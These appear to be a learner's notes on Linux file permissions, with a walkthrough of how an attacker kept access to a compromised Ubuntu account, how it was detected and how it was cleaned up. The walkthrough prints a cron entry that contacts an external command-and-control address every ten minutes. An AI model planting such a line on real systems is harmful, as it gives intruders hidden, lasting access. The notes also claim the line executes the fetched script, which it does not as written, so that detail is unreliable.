# Day 7 — File Permissions and Attack Scenarios

## Permission Hierarchy Review

Critical system files and their CORRECT permissions:

- **/etc/passwd (644)** — Owner: rw-, Group: r--, Others: r--
- **/etc/shadow (600)** — Owner: rw-, Group: ---, Others: ---
- **/etc/sudoers (440)** — Owner: r--, Group: r--, Others: ---
- **/etc/cron.d/ (755)** — Owner: rwx, Group: r-x, Others: r-x
- **/var/spool/cron/crontabs/ (rwx-wx--T)** — Sticky bit prevents tampering

## Attack Scenario: Ubuntu System Compromise

### Initial Compromise
Attacker gained **ubuntu user** access (compromised password or SSH key).

### Persistence via Cron
```bash
crontab -e
# Added this line:
*/10 * * * * curl http://185.220.101.45/beacon.sh > /dev/null 2>&1
```

### Why This Works
1. Ubuntu user CAN edit their own crontab (permissions allow it)
2. Cron runs as ubuntu user (sufficient for reconnaissance)
3. Downloads and executes attacker's script every 10 minutes
4. Output redirected to /dev/null (hides from user)
5. Still logged in syslog (390+ traces found)

### Permission Analysis
- **/var/spool/cron/crontabs/ubuntu** is owned by ubuntu
- Permissions -rw------- (only ubuntu can read/write)
- Directory is rwx-wx--T (sticky bit prevents deletion by others)
- Attacker had ubuntu privileges → can edit crontab

### Detection
1. List crontabs: `crontab -l` (shows beacon.sh)
2. Check syslog: `grep CRON /var/log/syslog | wc -l` (390 executions)
3. Timeline: May 3 → May 15 (12-day persistence)
4. Domain check: 185.220.101.45 is external C2 server

### Response
1. Block C2 IP at firewall
2. Remove malicious cron: `crontab -e` and delete beacon line
3. Change ubuntu password (compromised)
4. Search for other backdoors
5. Investigate how ubuntu user was compromised

## Key Learning

**Correct permissions don't prevent attacks if the user account itself is compromised.**

Security is LAYERED:
- Permissions protect against unauthorized users
- But if the authorized user (ubuntu) is compromised, permissions don't help
- Detection must focus on BEHAVIOR: unusual cron jobs, regular intervals, external connections

**The attacker didn't exploit permission weaknesses. They exploited ACCOUNT COMPROMISE.**
